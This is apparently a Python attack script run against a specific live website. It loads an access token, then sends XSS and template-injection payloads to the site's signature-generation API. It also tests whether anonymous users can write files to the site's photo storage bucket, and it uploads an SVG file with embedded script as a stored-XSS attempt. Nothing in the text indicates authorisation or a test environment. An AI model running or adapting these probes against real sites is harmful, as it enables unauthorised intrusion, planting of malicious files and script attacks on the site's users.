import ssl, json, urllib.request, urllib.error

ctx = ssl.create_default_context()

def req(method, url, body=None, token=None):
    h = {"User-Agent": "Mozilla/5.0"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode() if body is not None else None
    if body is not None:
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()

tok = json.load(open("token.txt"))["access_token"]
B = "https://onlyfakeai.ru"

# 1) signature generator probes
for payload in [
    {"text": "Rat4080"},
    {"text": "<svg onload=alert(1)>"},
    {"text": "{{7*7}}"},
    {"text": "${7*7}"},
]:
    st, hd, b = req("POST", B + "/api/generate-signature", body=payload)
    ct = hd.get("Content-Type", "?")
    print(f"sig text={payload['text'][:30]!r} -> {st} ct={ct} len={len(b)}")
    print("   ", b[:160])

# 2) anon storage write test on photos bucket
KEY = "<publishable-key>"
h = {"User-Agent": "Mozilla/5.0", "apikey": KEY, "Content-Type": "image/png"}
png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
r = urllib.request.Request(
    "https://cdn.onlyfakeai.ru/storage/v1/object/photos/rat4080_write_test.png",
    data=png, headers=h, method="POST")
try:
    with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
        print("anon upload ->", resp.status, resp.read()[:300])
except urllib.error.HTTPError as e:
    print("anon upload ->", e.code, e.read()[:300])

# 3) svg upload test
h2 = dict(h); h2["Content-Type"] = "image/svg+xml"
svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
r = urllib.request.Request(
    "https://cdn.onlyfakeai.ru/storage/v1/object/photos/rat4080_svg_test.svg",
    data=svg, headers=h2, method="POST")
try:
    with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
        print("svg upload ->", resp.status, resp.read()[:300])
except urllib.error.HTTPError as e:
    print("svg upload ->", e.code, e.read()[:300])
